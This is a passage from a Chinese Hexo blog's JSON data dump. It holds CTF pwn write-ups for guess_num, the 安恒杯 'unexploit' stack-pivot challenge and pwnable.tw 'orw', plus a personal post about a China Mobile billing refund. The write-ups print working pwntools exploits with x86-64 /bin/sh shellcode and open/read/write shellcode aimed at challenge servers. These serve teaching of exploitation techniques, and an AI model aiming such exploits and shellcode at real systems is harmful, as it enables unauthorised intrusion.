class=\"line\">elf = ELF(<span class=\"string\">'./guess_num'</span>)</span><br><span class=\"line\"> </span><br><span class=\"line\">libc = cdll.LoadLibrary(<span class=\"string\">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class=\"line\"> </span><br><span class=\"line\">payload = <span class=\"string\">'A'</span>*<span class=\"number\">32</span>  </span><br><span class=\"line\">payload += p64(<span class=\"number\">1</span>)   <span class=\"comment\">#覆盖种子为1</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">'name:'</span>)</span><br><span class=\"line\">p.sendline(payload)  </span><br><span class=\"line\"> </span><br><span class=\"line\">libc.srand(<span class=\"number\">1</span>)  <span class=\"comment\">#本地设置种子为一</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">10</span>):</span><br><span class=\"line\">        num = str(libc.rand()%<span class=\"number\">6</span>+<span class=\"number\">1</span>)</span><br><span class=\"line\">        p.recvuntil(<span class=\"string\">'number:'</span>)</span><br><span class=\"line\">        p.sendline(num)</span><br><span class=\"line\"> </span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n"},{"layout":"post","title":"安恒杯-unexploit","description":11,"date":"2019-08-04T16:00:00.000Z","_content":"\n## Checksec unexploit\n\n![img](/assets/images/2019-08-05-unexploit/unexploit2.png)\n\n没开保护，NX没开，第一时间想到的就是写shellcode进去。\n\n## ida分析\n\n![img](/assets/images/2019-08-05-unexploit/unexploit1.png)\n\n有一个栈溢出漏洞，但是只有**0x20**的空间。因此，可以用**栈迁移**。\n\n## 一些汇编指令\n```\nleave:\n    mov rsp,rbp   #将rsp指向rbp\n    pop rbp   #将栈中保存的父栈帧的 %rbp 的值赋值给 %rbp，并且 %rsp 上移一个位置指向父栈帧的结尾处。\nretn:\n    pop rsp   #将当前的ESP中指向的地址出栈，JMP到这个地址。\n```\n**所以我们可通过覆写rbp来使栈迁移到bss段去，并利用read函数去写入shellcode，再去执行shellcode。**\n\n## 先给出Exp\n```python\nfrom pwn import *\ncontext(os='linux', arch='amd64', log_level='debug')\n\np = remote('101.71.29.5',10015)\n#p = process('./unexploit')\n\nelf = ELF('unexploit')\nread_addr = 0x40068A\nbss_addr = elf.bss()\n\nshellcode = \"\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\"\n\npayload1 = 'a'*8+p64(bss_addr-8)+p64(read_addr)+p64(0xdeadbeef)\npayload2 = 'a'*8+p64(bss_addr+8)+p64(read_addr)+p64(0xdeadbeef)   #加上0xdeadbeef是为了填满0x20\npayload3 = p64(bss_addr+8)+shellcode\n\np.send(payload1)\np.send(payload2)\np.send(payload3)\np.interactive()\n```\n### payload1\n    mov rsp,rbp:\n                        +-------------+\n                        |  aaaaaaaa   |\n                        +-------------+  \n            rsp、rbp +->+  bss-0x8    |\n                        +-------------+\n                        |  read_addr  |\n                        +-------------+\n                        |  0xdeadbeef |\n                        +-------------+\n\n    pop rbp:\n            +-------------+          +-------------+\n            |  aaaaaaaa   |          |             |\n            +-------------+          +-------------+\n            |  bss-0x8    |    rbp+->+  bss-0x8    |\n            +-------------+          +-------------+\n      rsp+->+  read_addr  |          |  bss_start  |\n            +-------------+          +-------------+\n            |  0xdeadbeef |          |             |\n            +-------------+          +-------------+\n\n    pop rsp: 返回到read函数。\n\n### payload2   \n    mov rsp,rbp\n    pop rbp:\n                    +-------------+\n                    |  aaaaaaaa   |\n                    +-------------+\n                    |  bss+0x8    |\n                    +-------------+\n              rsp+->+  read_addr  |<-+bss-start\n                    +-------------+\n              rbp+->+  0xdeadbeef |\n                    +-------------+\n\n    pop rsp:返回到read函数。\n\n### payload3\n    mov rsp,pbp\n    pop rbp:\n            +-------------+\n            |  aaaaaaaa   |\n            +-------------+\n            |  bss+0x8    |\n            +-------------+\n            |  bss+0x8    |<-+bss-start\n            +-------------+\n      rsp+->+  shellcode  |\n            +-------------+\n\n    pop rsp:执行shellcode\n\n\n\n","source":"_posts/2019-08-05-安恒杯栈迁移.md","raw":"---\nlayout: post\ntitle: 安恒杯-unexploit\ncategories: pwn\ntags: [pwn]\ndescription: 11\ndate: 2019-08-05\n---\n\n## Checksec unexploit\n\n![img](/assets/images/2019-08-05-unexploit/unexploit2.png)\n\n没开保护，NX没开，第一时间想到的就是写shellcode进去。\n\n## ida分析\n\n![img](/assets/images/2019-08-05-unexploit/unexploit1.png)\n\n有一个栈溢出漏洞，但是只有**0x20**的空间。因此，可以用**栈迁移**。\n\n## 一些汇编指令\n```\nleave:\n    mov rsp,rbp   #将rsp指向rbp\n    pop rbp   #将栈中保存的父栈帧的 %rbp 的值赋值给 %rbp，并且 %rsp 上移一个位置指向父栈帧的结尾处。\nretn:\n    pop rsp   #将当前的ESP中指向的地址出栈，JMP到这个地址。\n```\n**所以我们可通过覆写rbp来使栈迁移到bss段去，并利用read函数去写入shellcode，再去执行shellcode。**\n\n## 先给出Exp\n```python\nfrom pwn import *\ncontext(os='linux', arch='amd64', log_level='debug')\n\np = remote('101.71.29.5',10015)\n#p = process('./unexploit')\n\nelf = ELF('unexploit')\nread_addr = 0x40068A\nbss_addr = elf.bss()\n\nshellcode = \"\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\"\n\npayload1 = 'a'*8+p64(bss_addr-8)+p64(read_addr)+p64(0xdeadbeef)\npayload2 = 'a'*8+p64(bss_addr+8)+p64(read_addr)+p64(0xdeadbeef)   #加上0xdeadbeef是为了填满0x20\npayload3 = p64(bss_addr+8)+shellcode\n\np.send(payload1)\np.send(payload2)\np.send(payload3)\np.interactive()\n```\n### payload1\n    mov rsp,rbp:\n                        +-------------+\n                        |  aaaaaaaa   |\n                        +-------------+  \n            rsp、rbp +->+  bss-0x8    |\n                        +-------------+\n                        |  read_addr  |\n                        +-------------+\n                        |  0xdeadbeef |\n                        +-------------+\n\n    pop rbp:\n            +-------------+          +-------------+\n            |  aaaaaaaa   |          |             |\n            +-------------+          +-------------+\n            |  bss-0x8    |    rbp+->+  bss-0x8    |\n            +-------------+          +-------------+\n      rsp+->+  read_addr  |          |  bss_start  |\n            +-------------+          +-------------+\n            |  0xdeadbeef |          |             |\n            +-------------+          +-------------+\n\n    pop rsp: 返回到read函数。\n\n### payload2   \n    mov rsp,rbp\n    pop rbp:\n                    +-------------+\n                    |  aaaaaaaa   |\n                    +-------------+\n                    |  bss+0x8    |\n                    +-------------+\n              rsp+->+  read_addr  |<-+bss-start\n                    +-------------+\n              rbp+->+  0xdeadbeef |\n                    +-------------+\n\n    pop rsp:返回到read函数。\n\n### payload3\n    mov rsp,pbp\n    pop rbp:\n            +-------------+\n            |  aaaaaaaa   |\n            +-------------+\n            |  bss+0x8    |\n            +-------------+\n            |  bss+0x8    |<-+bss-start\n            +-------------+\n      rsp+->+  shellcode  |\n            +-------------+\n\n    pop rsp:执行shellcode\n\n\n\n","slug":"2019-08-05-安恒杯栈迁移","published":1,"updated":"2020-07-03T16:12:42.756Z","comments":1,"photos":[],"link":"","_id":"ckc74vbkl00024djx9pq13lpi","content":"<h2 id=\"Checksec-unexploit\"><a href=\"#Checksec-unexploit\" class=\"headerlink\" title=\"Checksec unexploit\"></a>Checksec unexploit</h2><p><img src=\"/assets/images/2019-08-05-unexploit/unexploit2.png\" alt=\"img\"></p>\n<p>没开保护，NX没开，第一时间想到的就是写shellcode进去。</p>\n<h2 id=\"ida分析\"><a href=\"#ida分析\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h2><p><img src=\"/assets/images/2019-08-05-unexploit/unexploit1.png\" alt=\"img\"></p>\n<p>有一个栈溢出漏洞，但是只有<strong>0x20</strong>的空间。因此，可以用<strong>栈迁移</strong>。</p>\n<h2 id=\"一些汇编指令\"><a href=\"#一些汇编指令\" class=\"headerlink\" title=\"一些汇编指令\"></a>一些汇编指令</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">leave:</span><br><span class=\"line\">    mov rsp,rbp   #将rsp指向rbp</span><br><span class=\"line\">    pop rbp   #将栈中保存的父栈帧的 %rbp 的值赋值给 %rbp，并且 %rsp 上移一个位置指向父栈帧的结尾处。</span><br><span class=\"line\">retn:</span><br><span class=\"line\">    pop rsp   #将当前的ESP中指向的地址出栈，JMP到这个地址。</span><br></pre></td></tr></table></figure>\n<p><strong>所以我们可通过覆写rbp来使栈迁移到bss段去，并利用read函数去写入shellcode，再去执行shellcode。</strong></p>\n<h2 id=\"先给出Exp\"><a href=\"#先给出Exp\" class=\"headerlink\" title=\"先给出Exp\"></a>先给出Exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(os=<span class=\"string\">'linux'</span>, arch=<span class=\"string\">'amd64'</span>, log_level=<span class=\"string\">'debug'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p = remote(<span class=\"string\">'101.71.29.5'</span>,<span class=\"number\">10015</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = process('./unexploit')</span></span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(<span class=\"string\">'unexploit'</span>)</span><br><span class=\"line\">read_addr = <span class=\"number\">0x40068A</span></span><br><span class=\"line\">bss_addr = elf.bss()</span><br><span class=\"line\"></span><br><span class=\"line\">shellcode = <span class=\"string\">\"\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload1 = <span class=\"string\">'a'</span>*<span class=\"number\">8</span>+p64(bss_addr<span class=\"number\">-8</span>)+p64(read_addr)+p64(<span class=\"number\">0xdeadbeef</span>)</span><br><span class=\"line\">payload2 = <span class=\"string\">'a'</span>*<span class=\"number\">8</span>+p64(bss_addr+<span class=\"number\">8</span>)+p64(read_addr)+p64(<span class=\"number\">0xdeadbeef</span>)   <span class=\"comment\">#加上0xdeadbeef是为了填满0x20</span></span><br><span class=\"line\">payload3 = p64(bss_addr+<span class=\"number\">8</span>)+shellcode</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload1)</span><br><span class=\"line\">p.send(payload2)</span><br><span class=\"line\">p.send(payload3)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h3 id=\"payload1\"><a href=\"#payload1\" class=\"headerlink\" title=\"payload1\"></a>payload1</h3><pre><code>mov rsp,rbp:\n                    +-------------+\n                    |  aaaaaaaa   |\n                    +-------------+  \n        rsp、rbp +-&gt;+  bss-0x8    |\n                    +-------------+\n                    |  read_addr  |\n                    +-------------+\n                    |  0xdeadbeef |\n                    +-------------+\n\npop rbp:\n        +-------------+          +-------------+\n        |  aaaaaaaa   |          |             |\n        +-------------+          +-------------+\n        |  bss-0x8    |    rbp+-&gt;+  bss-0x8    |\n        +-------------+          +-------------+\n  rsp+-&gt;+  read_addr  |          |  bss_start  |\n        +-------------+          +-------------+\n        |  0xdeadbeef |          |             |\n        +-------------+          +-------------+\n\npop rsp: 返回到read函数。</code></pre><h3 id=\"payload2\"><a href=\"#payload2\" class=\"headerlink\" title=\"payload2\"></a>payload2</h3><pre><code>mov rsp,rbp\npop rbp:\n                +-------------+\n                |  aaaaaaaa   |\n                +-------------+\n                |  bss+0x8    |\n                +-------------+\n          rsp+-&gt;+  read_addr  |&lt;-+bss-start\n                +-------------+\n          rbp+-&gt;+  0xdeadbeef |\n                +-------------+\n\npop rsp:返回到read函数。</code></pre><h3 id=\"payload3\"><a href=\"#payload3\" class=\"headerlink\" title=\"payload3\"></a>payload3</h3><pre><code>mov rsp,pbp\npop rbp:\n        +-------------+\n        |  aaaaaaaa   |\n        +-------------+\n        |  bss+0x8    |\n        +-------------+\n        |  bss+0x8    |&lt;-+bss-start\n        +-------------+\n  rsp+-&gt;+  shellcode  |\n        +-------------+\n\npop rsp:执行shellcode</code></pre>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"Checksec-unexploit\"><a href=\"#Checksec-unexploit\" class=\"headerlink\" title=\"Checksec unexploit\"></a>Checksec unexploit</h2><p><img src=\"/assets/images/2019-08-05-unexploit/unexploit2.png\" alt=\"img\"></p>\n<p>没开保护，NX没开，第一时间想到的就是写shellcode进去。</p>\n<h2 id=\"ida分析\"><a href=\"#ida分析\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h2><p><img src=\"/assets/images/2019-08-05-unexploit/unexploit1.png\" alt=\"img\"></p>\n<p>有一个栈溢出漏洞，但是只有<strong>0x20</strong>的空间。因此，可以用<strong>栈迁移</strong>。</p>\n<h2 id=\"一些汇编指令\"><a href=\"#一些汇编指令\" class=\"headerlink\" title=\"一些汇编指令\"></a>一些汇编指令</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">leave:</span><br><span class=\"line\">    mov rsp,rbp   #将rsp指向rbp</span><br><span class=\"line\">    pop rbp   #将栈中保存的父栈帧的 %rbp 的值赋值给 %rbp，并且 %rsp 上移一个位置指向父栈帧的结尾处。</span><br><span class=\"line\">retn:</span><br><span class=\"line\">    pop rsp   #将当前的ESP中指向的地址出栈，JMP到这个地址。</span><br></pre></td></tr></table></figure>\n<p><strong>所以我们可通过覆写rbp来使栈迁移到bss段去，并利用read函数去写入shellcode，再去执行shellcode。</strong></p>\n<h2 id=\"先给出Exp\"><a href=\"#先给出Exp\" class=\"headerlink\" title=\"先给出Exp\"></a>先给出Exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(os=<span class=\"string\">'linux'</span>, arch=<span class=\"string\">'amd64'</span>, log_level=<span class=\"string\">'debug'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p = remote(<span class=\"string\">'101.71.29.5'</span>,<span class=\"number\">10015</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = process('./unexploit')</span></span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(<span class=\"string\">'unexploit'</span>)</span><br><span class=\"line\">read_addr = <span class=\"number\">0x40068A</span></span><br><span class=\"line\">bss_addr = elf.bss()</span><br><span class=\"line\"></span><br><span class=\"line\">shellcode = <span class=\"string\">\"\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload1 = <span class=\"string\">'a'</span>*<span class=\"number\">8</span>+p64(bss_addr<span class=\"number\">-8</span>)+p64(read_addr)+p64(<span class=\"number\">0xdeadbeef</span>)</span><br><span class=\"line\">payload2 = <span class=\"string\">'a'</span>*<span class=\"number\">8</span>+p64(bss_addr+<span class=\"number\">8</span>)+p64(read_addr)+p64(<span class=\"number\">0xdeadbeef</span>)   <span class=\"comment\">#加上0xdeadbeef是为了填满0x20</span></span><br><span class=\"line\">payload3 = p64(bss_addr+<span class=\"number\">8</span>)+shellcode</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload1)</span><br><span class=\"line\">p.send(payload2)</span><br><span class=\"line\">p.send(payload3)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h3 id=\"payload1\"><a href=\"#payload1\" class=\"headerlink\" title=\"payload1\"></a>payload1</h3><pre><code>mov rsp,rbp:\n                    +-------------+\n                    |  aaaaaaaa   |\n                    +-------------+  \n        rsp、rbp +-&gt;+  bss-0x8    |\n                    +-------------+\n                    |  read_addr  |\n                    +-------------+\n                    |  0xdeadbeef |\n                    +-------------+\n\npop rbp:\n        +-------------+          +-------------+\n        |  aaaaaaaa   |          |             |\n        +-------------+          +-------------+\n        |  bss-0x8    |    rbp+-&gt;+  bss-0x8    |\n        +-------------+          +-------------+\n  rsp+-&gt;+  read_addr  |          |  bss_start  |\n        +-------------+          +-------------+\n        |  0xdeadbeef |          |             |\n        +-------------+          +-------------+\n\npop rsp: 返回到read函数。</code></pre><h3 id=\"payload2\"><a href=\"#payload2\" class=\"headerlink\" title=\"payload2\"></a>payload2</h3><pre><code>mov rsp,rbp\npop rbp:\n                +-------------+\n                |  aaaaaaaa   |\n                +-------------+\n                |  bss+0x8    |\n                +-------------+\n          rsp+-&gt;+  read_addr  |&lt;-+bss-start\n                +-------------+\n          rbp+-&gt;+  0xdeadbeef |\n                +-------------+\n\npop rsp:返回到read函数。</code></pre><h3 id=\"payload3\"><a href=\"#payload3\" class=\"headerlink\" title=\"payload3\"></a>payload3</h3><pre><code>mov rsp,pbp\npop rbp:\n        +-------------+\n        |  aaaaaaaa   |\n        +-------------+\n        |  bss+0x8    |\n        +-------------+\n        |  bss+0x8    |&lt;-+bss-start\n        +-------------+\n  rsp+-&gt;+  shellcode  |\n        +-------------+\n\npop rsp:执行shellcode</code></pre>"},{"layout":"post","title":"对线中国移动","description":11,"date":"2019-09-06T16:00:00.000Z","_content":"\n\n## 2019年9月7日上午 10:48\n\n&emsp;&emsp;家里的移动电视提示话费不足，并且是刚交90元话费的情况下。疑惑之下，登陆了移动网上营业厅。  \n\n&emsp;&emsp;宽带是今年3月办的，其中有4项增值业务，合计40元。  \n\n* 和家相册基本版 9.00元\n* 和彩云尊享版 25.00元 ~~smjb~~\n* 来电提醒（增强版）包月功能费 3.00元\n* 彩印业务信息费 3.00元  \n\n&emsp;&emsp;一怒之下，10086转人工。  \n> **人在外地的话拨打** ***区号+10086***  \n> **事先重置服务密码** **本机编辑短信 “40\\*新密码\\*身份证号#”到10086**\n\n&emsp;&emsp;向移动客服说明情况，上报领导说2天后给答复。之后本机也收到了投诉编码。  \n&emsp;&emsp;之后到[中国移动投诉与建议](http://www.10086.cn/support/selfservice/suggest/)再次提交了一次投诉工单。\n\n## 2019年9月7日下午 15:59\n&emsp;&emsp;号码为 010086 ~~一加6标记疑似诈骗~~来自北京的电话，说明上述业务为赠送至5月（到期之后未取消），之后费用转换为话费退还，共计200元。 \n\n## 2019年9月7日下午 16:17\n\n&emsp;&emsp;话费成功到账。\n![img](/assets/images/2019-09-07-中国移动维权之路/Screenshot1.jpg)\n![img](/assets/images/2019-09-07-中国移动维权之路/Screenshot2.jpg)\n\n","source":"_posts/2019-09-07-对线中国移动.md","raw":"---\nlayout: post\ntitle: 对线中国移动\ncategories: life\ntags: [life]\ndescription: 11\ndate: 2019-09-07\n---\n\n\n## 2019年9月7日上午 10:48\n\n&emsp;&emsp;家里的移动电视提示话费不足，并且是刚交90元话费的情况下。疑惑之下，登陆了移动网上营业厅。  \n\n&emsp;&emsp;宽带是今年3月办的，其中有4项增值业务，合计40元。  \n\n* 和家相册基本版 9.00元\n* 和彩云尊享版 25.00元 ~~smjb~~\n* 来电提醒（增强版）包月功能费 3.00元\n* 彩印业务信息费 3.00元  \n\n&emsp;&emsp;一怒之下，10086转人工。  \n> **人在外地的话拨打** ***区号+10086***  \n> **事先重置服务密码** **本机编辑短信 “40\\*新密码\\*身份证号#”到10086**\n\n&emsp;&emsp;向移动客服说明情况，上报领导说2天后给答复。之后本机也收到了投诉编码。  \n&emsp;&emsp;之后到[中国移动投诉与建议](http://www.10086.cn/support/selfservice/suggest/)再次提交了一次投诉工单。\n\n## 2019年9月7日下午 15:59\n&emsp;&emsp;号码为 010086 ~~一加6标记疑似诈骗~~来自北京的电话，说明上述业务为赠送至5月（到期之后未取消），之后费用转换为话费退还，共计200元。 \n\n## 2019年9月7日下午 16:17\n\n&emsp;&emsp;话费成功到账。\n![img](/assets/images/2019-09-07-中国移动维权之路/Screenshot1.jpg)\n![img](/assets/images/2019-09-07-中国移动维权之路/Screenshot2.jpg)\n\n","slug":"2019-09-07-对线中国移动","published":1,"updated":"2020-07-03T16:12:46.904Z","comments":1,"photos":[],"link":"","_id":"ckc74vbl100064djx5l0l0h0v","content":"<h2 id=\"2019年9月7日上午-10-48\"><a href=\"#2019年9月7日上午-10-48\" class=\"headerlink\" title=\"2019年9月7日上午 10:48\"></a>2019年9月7日上午 10:48</h2><p>&emsp;&emsp;家里的移动电视提示话费不足，并且是刚交90元话费的情况下。疑惑之下，登陆了移动网上营业厅。  </p>\n<p>&emsp;&emsp;宽带是今年3月办的，其中有4项增值业务，合计40元。  </p>\n<ul>\n<li>和家相册基本版 9.00元</li>\n<li>和彩云尊享版 25.00元 <del>smjb</del></li>\n<li>来电提醒（增强版）包月功能费 3.00元</li>\n<li>彩印业务信息费 3.00元  </li>\n</ul>\n<p>&emsp;&emsp;一怒之下，10086转人工。  </p>\n<blockquote>\n<p><strong>人在外地的话拨打</strong> <strong><em>区号+10086</em></strong><br><strong>事先重置服务密码</strong> <strong>本机编辑短信 “40*新密码*身份证号#”到10086</strong></p>\n</blockquote>\n<p>&emsp;&emsp;向移动客服说明情况，上报领导说2天后给答复。之后本机也收到了投诉编码。<br>&emsp;&emsp;之后到<a href=\"http://www.10086.cn/support/selfservice/suggest/\" target=\"_blank\" rel=\"noopener\">中国移动投诉与建议</a>再次提交了一次投诉工单。</p>\n<h2 id=\"2019年9月7日下午-15-59\"><a href=\"#2019年9月7日下午-15-59\" class=\"headerlink\" title=\"2019年9月7日下午 15:59\"></a>2019年9月7日下午 15:59</h2><p>&emsp;&emsp;号码为 010086 <del>一加6标记疑似诈骗</del>来自北京的电话，说明上述业务为赠送至5月（到期之后未取消），之后费用转换为话费退还，共计200元。 </p>\n<h2 id=\"2019年9月7日下午-16-17\"><a href=\"#2019年9月7日下午-16-17\" class=\"headerlink\" title=\"2019年9月7日下午 16:17\"></a>2019年9月7日下午 16:17</h2><p>&emsp;&emsp;话费成功到账。<br><img src=\"/assets/images/2019-09-07-%E4%B8%AD%E5%9B%BD%E7%A7%BB%E5%8A%A8%E7%BB%B4%E6%9D%83%E4%B9%8B%E8%B7%AF/Screenshot1.jpg\" alt=\"img\"><br><img src=\"/assets/images/2019-09-07-%E4%B8%AD%E5%9B%BD%E7%A7%BB%E5%8A%A8%E7%BB%B4%E6%9D%83%E4%B9%8B%E8%B7%AF/Screenshot2.jpg\" alt=\"img\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"2019年9月7日上午-10-48\"><a href=\"#2019年9月7日上午-10-48\" class=\"headerlink\" title=\"2019年9月7日上午 10:48\"></a>2019年9月7日上午 10:48</h2><p>&emsp;&emsp;家里的移动电视提示话费不足，并且是刚交90元话费的情况下。疑惑之下，登陆了移动网上营业厅。  </p>\n<p>&emsp;&emsp;宽带是今年3月办的，其中有4项增值业务，合计40元。  </p>\n<ul>\n<li>和家相册基本版 9.00元</li>\n<li>和彩云尊享版 25.00元 <del>smjb</del></li>\n<li>来电提醒（增强版）包月功能费 3.00元</li>\n<li>彩印业务信息费 3.00元  </li>\n</ul>\n<p>&emsp;&emsp;一怒之下，10086转人工。  </p>\n<blockquote>\n<p><strong>人在外地的话拨打</strong> <strong><em>区号+10086</em></strong><br><strong>事先重置服务密码</strong> <strong>本机编辑短信 “40*新密码*身份证号#”到10086</strong></p>\n</blockquote>\n<p>&emsp;&emsp;向移动客服说明情况，上报领导说2天后给答复。之后本机也收到了投诉编码。<br>&emsp;&emsp;之后到<a href=\"http://www.10086.cn/support/selfservice/suggest/\" target=\"_blank\" rel=\"noopener\">中国移动投诉与建议</a>再次提交了一次投诉工单。</p>\n<h2 id=\"2019年9月7日下午-15-59\"><a href=\"#2019年9月7日下午-15-59\" class=\"headerlink\" title=\"2019年9月7日下午 15:59\"></a>2019年9月7日下午 15:59</h2><p>&emsp;&emsp;号码为 010086 <del>一加6标记疑似诈骗</del>来自北京的电话，说明上述业务为赠送至5月（到期之后未取消），之后费用转换为话费退还，共计200元。 </p>\n<h2 id=\"2019年9月7日下午-16-17\"><a href=\"#2019年9月7日下午-16-17\" class=\"headerlink\" title=\"2019年9月7日下午 16:17\"></a>2019年9月7日下午 16:17</h2><p>&emsp;&emsp;话费成功到账。<br><img src=\"/assets/images/2019-09-07-%E4%B8%AD%E5%9B%BD%E7%A7%BB%E5%8A%A8%E7%BB%B4%E6%9D%83%E4%B9%8B%E8%B7%AF/Screenshot1.jpg\" alt=\"img\"><br><img src=\"/assets/images/2019-09-07-%E4%B8%AD%E5%9B%BD%E7%A7%BB%E5%8A%A8%E7%BB%B4%E6%9D%83%E4%B9%8B%E8%B7%AF/Screenshot2.jpg\" alt=\"img\"></p>\n"},{"layout":"post","title":"prctl&pwnable_orw","description":11,"date":"2020-02-24T16:00:00.000Z","_content":"\n\n\n\n## 相关工具\nseccomp-tools https://github.com/david942j/seccomp-tools\n\n## orw\n```\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX disabled\n    PIE:      No PIE (0x8048000)\n    RWX:      Has RWX segments\n```\n拽进Ida，根据prctl函数可以确定几个结构体。\n```\n  qmemcpy(&sock_filter, stru_8048640, 0x60u);\n  LOWORD(sfp.len) = 12;\n  sfp.filter = &sock_filter;\n  prctl(38, 1, 0, 0, 0);                        // prctl(PR_SET_NO_NEW_PRIVS,1,0,0,0);\n  prctl(22, 2, &sfp);                           // prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&prog);\n```\n\n![img](/assets/images/2020-02-07-prctl&pwnable_orw/struct3.png)\n![img](/assets/images/2020-02-07-prctl&pwnable_orw/struct1.png)\n\n\n整个程序就是让我们输入一段shellcode，去打开提示所说的 **/home/orw/flag** \n\n\n```\n➜  seccomp-tools dump ./orw\n line  CODE  JT   JF      K\n=================================\n 0000: 0x20 0x00 0x00 0x00000004  A = arch\n 0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011\n 0002: 0x20 0x00 0x00 0x00000000  A = sys_number\n 0003: 0x15 0x07 0x00 0x000000ad  if (A == rt_sigreturn) goto 0011\n 0004: 0x15 0x06 0x00 0x00000077  if (A == sigreturn) goto 0011\n 0005: 0x15 0x05 0x00 0x000000fc  if (A == exit_group) goto 0011\n 0006: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0011\n 0007: 0x15 0x03 0x00 0x00000005  if (A == open) goto 0011\n 0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011\n 0009: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0011\n 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38)\n 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW\n```\n能用的函数：rt_sigreturn、sigreturn、exit_group、exit、open、read、write\n\n## exp\n```python\nfrom pwn import *\np = remote('chall.pwnable.tw',10001)\nshellcode = ''\n#open(/home/orw/flag,0,0)\nshellcode+=asm('mov eax,0x5;push 0x00006761;push 0x6c662f77;push 0x726f2f65;push 0x6d6f682f;mov ebx,esp;int 0x80;')\n#read(3,/home/orw/flag,0x30)\nshellcode +=asm('mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x30;int 0x80;')\n#write(1,/home/orw/flag,0x30)\nshellcode+=asm('mov eax,0x4; mov ebx,0x1;int 0x80;')\np.recvuntil(':')\np.send(shellcode)\np.interactive()\n```\n\n在 http://syscalls.kernelgrok.com/ 可以看到调用号和各寄存器作用\n","source":"_posts/2020-02-05-prctl&pwnable_orw.md","raw":"---\nlayout: post\ntitle: prctl&pwnable_orw\ncategories: pwn\ntags: [pwn]\ndescription: 11\ndate: 2020-02-25\n---\n\n\n\n\n## 相关工具\nseccomp-tools https://github.com/david942j/seccomp-tools\n\n## orw\n```\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX disabled\n    PIE:      No PIE (0x8048000)\n    RWX:      Has RWX segments\n```\n拽进Ida，根据prctl函数可以确定几个结构体。\n```\n  qmemcpy(&sock_filter, stru_8048640, 0x60u);\n  LOWORD(sfp.len) = 12;\n  